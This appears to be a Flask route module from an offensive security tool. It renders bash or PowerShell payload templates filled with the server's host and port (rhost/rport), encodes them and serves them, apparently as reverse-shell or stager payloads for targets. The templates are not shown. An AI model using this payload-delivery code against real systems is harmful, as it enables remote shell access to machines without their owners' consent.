import http

import flask

from ... import events, utilities


blueprint = flask.Blueprint('utilities', __name__)


PAYLOADS = {
    'linux': ['bash'],
    'windows': ['powershell']}


@blueprint.get('/<interpreter>')
def shell(*, context='execution', interpreter, test=False, **kwargs):
    context, encoding = utilities.context_parse(context)
    if context is None:
        flask.abort(http.HTTPStatus.BAD_REQUEST)

    rhost = flask.current_app.config['HOST']
    rport = flask.current_app.config['PORT']

    interpreter, platform = utilities.interpreter_parse(interpreter)
    if platform is None:
        flask.abort(http.HTTPStatus.BAD_REQUEST)

    if 'execution'.startswith(context):
        if interpreter not in PAYLOADS[platform]:
            flask.abort(http.HTTPStatus.BAD_REQUEST)

        template = f'shells/utilities/{platform}_{interpreter}.jinja'
        payload = flask.render_template(template, rhost=rhost, rport=rport)
    elif 'target'.startswith(context):
        template = f'shells/utilities/{platform}_target.jinja'
        payload = flask.render_template(
            template,
            path=flask.request.path,
            rhost=rhost,
            rport=rport)
    else:
        flask.abort(http.HTTPStatus.BAD_REQUEST)

    payload = payload.strip()
    payload = utilities.payload_encode(payload, encoding)

    response = flask.make_response(payload, 200, {'Content-Type': 'text/pain'})

    flask.current_app.logger.info(
        events.Source.EYETEA_UTILITIES.value,
        extra={
            'response': response,
            'source': events.Source.EYETEA_UTILITIES})

    return response

